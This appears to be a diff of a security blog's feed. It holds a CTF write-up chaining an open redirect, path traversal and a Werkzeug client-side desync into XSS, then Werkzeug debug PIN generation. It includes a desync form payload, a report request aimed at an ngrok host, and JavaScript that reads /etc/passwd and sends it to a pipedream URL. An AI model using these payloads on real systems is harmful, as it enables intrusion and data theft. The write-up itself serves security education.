+<br /></p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bugbounty" /><category term="xss" /><category term="google" /><category term="rce" /><summary type="html"><![CDATA[Technical breakdown of a Remote Code Execution vulnerability in Google Web Designer via a malicious Video Ad Template abusing the NinjaShell API.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/tmp/cdn-images//vlc_F5uL7S9FCj.png" /><media:content medium="image" url="http://localhost:4000/tmp/cdn-images//vlc_F5uL7S9FCj.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">XSS in Google IDX Workstation</title><link href="http://localhost:4000/2025/07/02/idx.html" rel="alternate" type="text/html" title="XSS in Google IDX Workstation" /><published>2025-07-02T00:00:00+05:30</published><updated>2025-07-02T00:00:00+05:30</updated><id>http://localhost:4000/2025/07/02/idx</id><content type="html" xml:base="http://localhost:4000/2025/07/02/idx.html"><![CDATA[<p>Heyyy Everyyonee,</p>
 
 <p>In this blogpost I am going talk about one my bugs which I submitted to Google VRP last year. The report is disclosed publically but I really felt it’s hard to understand the inner working of the bug just based on the report I wanted to do a very detailed blogpost so here I am :)</p>
 
@@ -3457,447 +3777,4 @@ As I already explained winA and winB are of same origin login.redacted.com , we 
 
 <p>The above code will give us the url which can be used now to login into the victim’s account.There is just one important thing to take care of which is the <code class="language-plaintext highlighter-rouge">idccsrf</code> token at first I didn;t noticed this cookie parameter and was wondering for so long why I wasn’t able to login to victim’s acc.</p>
 
-<p>So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim’s account.</p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.]]></summary></entry><entry><title type="html">Hackthebox Business Ctf Writeup</title><link href="http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup.html" rel="alternate" type="text/html" title="Hackthebox Business Ctf Writeup" /><published>2023-07-18T00:00:00+05:30</published><updated>2023-07-18T00:00:00+05:30</updated><id>http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup</id><content type="html" xml:base="http://localhost:4000/2023/07/18/Hackthebox-Business-CTF-Writeup.html"><![CDATA[<h1 id="web-desynth-recruit">Web Desynth Recruit</h1>
-
-<p>Me and my friend (@0xbla) spent our weekend solving a very interesting challenge from HTB Business CTF</p>
-
-<p>The challenge was very realistic and it required you to chain a lot of other bugs to solve it, probably the best one we have ever seen.</p>
-
-<p>I will give you a basic idea about the challenge:</p>
-
-<p>The application had basic login/signup flow
-<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/f0ac9707-b786-423a-8f37-7d04237e3a5f" alt="image" /></p>
-
-<p>Once logged in you were redirect to the <code class="language-plaintext highlighter-rouge">/settings</code> endpoint which allowed you to make changes to your profile: http://localhost:1337/settings</p>
-
-<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4746400e-81fa-4eba-af17-2f4ea3c4134b" alt="image" /></p>
-
-<p>The Bio input field says that <em>Bio (limited HTML supported)</em> , so we will put some basic html tags and see if they are rendered or not <code class="language-plaintext highlighter-rouge">&lt;i&gt;shirley&lt;/i&gt;</code> , there is also a file upload which only allows to upload png files.
-Once we submit this form , we get this message: <em>Your profile is now public</em></p>
-
-<p>We can now visit our profile via this url : http://localhost:1337/profile/3
-(The id 1,2 are reserved for other users probably admin)</p>
-
-<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7ae40860-a2f9-42e0-ae2e-a45b98387d36" alt="image" /></p>
-
-<p>From the above screenshot you could see that the <em>Bio</em> field html code didn’t worked although it said that basic html tags were allowed. I also tried some more tags but all of them weren’t rendered.
-On the right side you could see we have <em>Report a user</em> functionality where we could report any user profile by just supplying it’s user id.</p>
-
-<p>Going through burp history , I found this endpoint: http://localhost:1337/go?to=/login
-It was found to be vulnerable to open redirect, let’s add it to our note and move forward with the source code review part.</p>
-
-<hr />
-
-<h1 id="source-code">Source Code</h1>
-
-<p>The application is in python Flask and it is running in debug mode</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">application.main</span> <span class="kn">import</span> <span class="n">app</span>
-
-<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>The flag is stored on the file system not exposed anywhere else so we might need a rce and also the location is random.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># change flag name</span>
-<span class="nb">mv</span> /flag.txt /flag<span class="si">$(</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-cd</span> <span class="s1">'a-f0-9'</span> | <span class="nb">head</span> <span class="nt">-c</span> 10<span class="si">)</span>.txt
-</code></pre></div></div>
-
-<p>The routes are defined here: /application/blueprints/routes.py</p>
-
-<p>We can confirm the open redirect root cause from here:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/go</span><span class="sh">'</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">goto_external_url</span><span class="p">():</span>
-    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">to</span><span class="sh">'</span><span class="p">))</span>
-</code></pre></div></div>
-
-<p>These one routes which isn’t allowed to be access by normal user, looked interesting:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_download</span><span class="sh">'</span><span class="p">)</span>
-<span class="nd">@is_authenticated</span>
-<span class="k">def</span> <span class="nf">ipc_download</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Unauthorized</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>
-
-    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">UPLOAD_FOLDER</span><span class="sh">"</span><span class="p">])</span><span class="si">}{</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
-            <span class="n">file_content</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
-        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">file_content</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="sh">'</span><span class="s">application/octet-stream</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Something Went Wrong!</span><span class="sh">'</span><span class="p">)</span>
-
-
-</code></pre></div></div>
-
-<p>This endpoint is responsible for sending the response of the ipc document submitted during profile update but as there is no check on the file param <code class="language-plaintext highlighter-rouge">request.args.get("file")</code> we could path traverse and read any file we want.
-We can’t use this to read the flag directly as the flag has random name suffix to it and also this is only accessible by admin user.</p>
-
-<p>If we want to read the response of this endpoint to read any file we would need a xss bu, which get’s executed in the bot’s browser so that we could access this endpoint and read the response.</p>
-
-<p>The Upload IPC endpoint was also interesting:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_submit</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
-<span class="nd">@is_authenticated</span>
-<span class="k">def</span> <span class="nf">ipc_submit</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
-    <span class="k">if</span> <span class="sh">'</span><span class="s">file</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file!</span><span class="sh">'</span><span class="p">)</span>
-    
-    <span class="n">ipc_file</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">]</span>
-
-    <span class="k">if</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">No selected file!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
-    
-    <span class="k">if</span> <span class="n">ipc_file</span> <span class="ow">and</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">):</span>
-        <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span><span class="si">}</span><span class="s">.png</span><span class="sh">'</span>  <span class="c1"># [1]
-</span>        <span class="n">ipc_file</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">UPLOAD_FOLDER</span><span class="sh">'</span><span class="p">],</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span> <span class="c1"># [2]
-</span>        <span class="nf">update_ipc_db</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
-
-        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">File submitted! Our moderators will review your request.</span><span class="sh">'</span><span class="p">)</span>
-    
-    <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file! only png files are allowed</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
-</code></pre></div></div>
-
-<p>On line [1], you could see <code class="language-plaintext highlighter-rouge">ipc_file.filename</code> value is taken from the username (which is controllable by the user) and then directly used in <code class="language-plaintext highlighter-rouge">path.join</code> operation.</p>
-
-<p>This is bad practise as it leads to path traversal here also</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">)</span>
-<span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">sudi</span><span class="sh">'</span><span class="p">)</span>
-<span class="sh">'</span><span class="s">/home/ubuntu/sudi</span><span class="sh">'</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span><span class="p">)</span>
-<span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span>
-</code></pre></div></div>
-
-<p>If the username is like this <code class="language-plaintext highlighter-rouge">/username</code> then os.path.join operation will return <code class="language-plaintext highlighter-rouge">/username</code> instead (it will ignore everything what’s before) this would have allowed us to have arbitrary file write on the file system which we could we use to overwrite any template then get easy rce but as the application appends the extenion to it <code class="language-plaintext highlighter-rouge">f'{user["username"]}.png'</code> we can’t make use of this as we can;t do anything malicious by overwriting png files.</p>
-
-<p>Examining the bot.py file we discover something:</p>
-
-<p>The report endpoint takes the value from the id parameter but as there is no checks we can provide anything else also there.</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/report</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
-<span class="nd">@is_authenticated</span>
-<span class="k">def</span> <span class="nf">report</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="p">.</span><span class="n">is_json</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Missing required parameters!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>
-    
-    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">()</span>
-
-    <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>bot.py</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/login</span><span class="sh">"</span><span class="p">)</span>
-
-    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
-    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
-    <span class="n">client</span><span class="p">.</span><span class="nf">execute_script</span><span class="p">(</span><span class="sh">"</span><span class="s">document.getElementById(</span><span class="sh">'</span><span class="s">login-btn</span><span class="sh">'</span><span class="s">).click()</span><span class="sh">"</span><span class="p">)</span>
-    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/profile/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span> <span class="o">//</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
-    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>On line [3] you could see the <code class="language-plaintext highlighter-rouge">id</code> is directly added to the url , this again could lead to path traversal. This one is interesing as we could chain this with the open redirect bug.
-Let me explain the bot was restricted to visit the profile page only but due to the path traversal and open redirect bug we could make the bot visit any page we want.</p>
-
-<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
-    </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"../go?to=https://atacker.com/"</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<p>This gave more of a hint that the xss bug can be on any page instead of just the profile page.</p>
-
-<p>We we started looking at the client side javascript code, to look for any xss sink:</p>
-
-<p>At first this looked interesting:</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">populateBots</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
-    <span class="kd">let</span> <span class="nx">sBots</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">data</span><span class="p">(</span><span class="dl">'</span><span class="s1">botExp</span><span class="dl">'</span><span class="p">);</span>
-
-    <span class="kd">let</span> <span class="nx">botsHTML</span> <span class="o">=</span> <span class="s2">`&lt;div class="row justify-content-center"&gt;`</span><span class="p">;</span>
-
-    <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">botsData</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
-        <span class="k">if </span><span class="p">(</span><span class="nx">sBots</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
-            <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`
-            &lt;div class='col-md-3 bots-col'&gt;
-                &lt;img src='</span><span class="p">${</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">}</span><span class="s2">' class='bots-img'&gt;
-            &lt;/div&gt;`</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`&lt;/div&gt;`</span><span class="p">;</span>
-
-    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">botsHTML</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>[4] botsData is decalred inside this file http://localhost:1337/static/js/global.js</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">botsData</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="p">{</span>
-       <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">DisBot</span><span class="dl">"</span><span class="p">,</span>
-       <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/static/images/bots/jake-parker-discord.png</span><span class="dl">"</span>
-    <span class="p">}</span>
-</code></pre></div></div>
-
-<p>As the source is directly used in the jquery html sink we thought if we can clobber <code class="language-plaintext highlighter-rouge">window.botsData</code> we could get xss.But we couldn’t find any injection point.</p>
-
-<p>Meanwhile my friend pointed out that the <code class="language-plaintext highlighter-rouge">/debug</code> endpoint has Werkzeug console exposed (as the application is running in debug mode), but we don’t know the pin.</p>
-
-<p>This is where we came up with a plan how to solve this challenge by chaining all the pieces we already have.</p>
-
-<p>Searching on google we found this blog https://www.daehee.com/werkzeug-console-pin-exploit/, which explains how you can genrate the PIN if you have a path traversal bug.By following this we should be able to get the PIN</p>
-
-<p>Here’s how the attack will look:
-Consider the xss endpoint to be <code class="language-plaintext highlighter-rouge">/xssendpoint</code></p>
-
-<p>In the report endpoint, modify the id parameter in the request to <code class="language-plaintext highlighter-rouge">../go?to=/xssendpoint</code> . This will redirect the bot to the page where we have xss.Using the  xss bug make a request to the <code class="language-plaintext highlighter-rouge">/api/ipc_download?file=../../../../etc/passwd</code> endpoint and get the response and sent it to our controlled server. (we will fetch the necessary information needed to generate the pin)</p>
-
-<hr />
-
-<h1 id="xss">XSS</h1>
-
-<p>We are still misisng an important piece to prove our attack , xss. At this point we were clueless then my friend pointed our that the challenge name relates <em>web desync</em> maybe we need to exploit this to get xss.
-At that time we both remembered about seeing a new research by @kevin_mizu on <em>Abusing Client-Side Desync on Werkzeug</em> as we were dealing Werkzeug this looked very promising.</p>
-
-<p>https://mizu.re/post/abusing-client-side-desync-on-werkzeug</p>
-
-<p>Oxbla confirmed that it is ineeded vulnerable to desync attack. I was reading the research blog at that time as I am not good with this attack, the version mentioned in that blog was same as what was used in the challenge</p>
-
-<p>requirements.txt</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flask==2.1.0
-Werkzeug==2.1.0
-</code></pre></div></div>
-
-<p>https://nvd.nist.gov/vuln/detail/cve-2022-29361</p>
-
-<p>Mizu really went deep into his research and even undercover an interesting open redirect to demonstrate how this bug could could be chained together which will lead to account takeover.</p>
-
-<p>I won’t go into the details as Mizu already explained everything very well in simple terms so make sure to read his research before continuing</p>
-
-<p>This is the open redirect which I am talking about :</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://google.com HTTP/1.1
-Host: localhost:1337
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en-US;q=0.9,en;q=0.8
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
-
-
-</code></pre></div></div>
-
-<p>Response:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 308 PERMANENT REDIRECT
-Server: Werkzeug/2.1.0 Python/3.11.4
-Date: Mon, 17 Jul 2023 15:18:31 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 262
-Location: http://google.com/?
-</code></pre></div></div>
-
-<p>Again check the research blog if you want to know the root cause of this.</p>
-
-<p>By using a form such as this:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
-    <span class="na">method=</span><span class="s">"POST"</span>
-    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET https://attacker.com HTTP/1.1
-    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
-    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
-    <span class="nt">&lt;/form&gt;</span>
-
-
-<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
-</code></pre></div></div>
-
-<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/d13d01d6-84ca-4975-96f4-49e0c0796de5" alt="image" /></p>
-
-<p>Upon submitting the above form this what happened:
-<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7fdfcc5b-4f7d-4c6b-b3b7-16bbef90c0f8" alt="image" /></p>
-
-<p><em>As we have a Client-Side Desync in Werkzeug, and this kind of attacks allows to control arbitrary bytes of the next request, it is possible to abuse it to recreate the open redirect payload from a malicious HTTP request.</em></p>
-
-<p>Quoting this from Mizu’s blog what’s happening here is that the payload send in the request body is used in the next request</p>
-
-<p>In our case the next request was made to http://localhost:1337/static/js/jquery.js , due to the bug in the parsing the request the server  instead of returning the original jquery.js code it returns a 308 redirect response to https://attacker.com (whatever code is returned by this server will be loaded in the page instead jquery.js) this give us a nice xss.</p>
-
-<p>We can confirm this xss by adding this payload to our index.html file</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">alert</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4899cdfb-f18f-43bf-9c7b-61a01fbfad9d" alt="image" /></p>
-
-<p>Great we have the xss now :)</p>
-
-<p>Sample code to read any local file</p>
-
-<p>index.html</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/ipc_download?file=../../../../etc/passwd</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
-    <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
-  <span class="p">})</span>
-    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
-    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
-      <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-      <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
-      <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
-    <span class="p">});</span>
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/report HTTP/1.1
-Host: 127.0.0.1:1337
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
-Content-Type: application/json
-Content-Length: 94
-
-{
-  "id": "../go?to=http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app/test.html"
-}
-</code></pre></div></div>
-
-<p>test.html contents</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
-    <span class="na">method=</span><span class="s">"POST"</span>
-    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app HTTP/1.1
-    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
-    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
-    <span class="nt">&lt;/form&gt;</span>
-
-
-<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
-</code></pre></div></div>
-
-<p><img src="https://user-images.githubusercontent.com/31372554/254163199-24f67c10-a553-4cf4-a363-36eea20310d5.png" alt="image" /></p>
-
-<hr />
-
-<p>To generate the PIN value on our end we need to know some values beforehand:</p>
-
-<p>https://www.daehee.com/werkzeug-console-pin-exploit/</p>
-
-<p>If you are interested in checking the source which generates the pin here it is: https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/<strong>init</strong>.py#L138</p>
-
-<p>We will be using this script to generate the pin: https://github.com/wdahlenburg/werkzeug-debug-console-bypass</p>
-
-<p>As we have alocal setup most of the things we already know:</p>
-
-<blockquote>
-  <p>username is the user who started this Flask
-root</p>
-</blockquote>
-
-<blockquote>
-  <p>modname
-flask.app</p>
-</blockquote>
-
-<blockquote>
-  <p>getattr(app, ‘<strong>name</strong>’, getattr (app .__ class__, ‘<strong>name</strong>’))
-Flask
-getattr(mod, ‘<strong>file</strong>’, None) #is the absolute path of an app.py in the flask directory
-/usr/local/lib/python3.11/site-packages/flask/app.py</p>
-</blockquote>
-
-<blockquote>
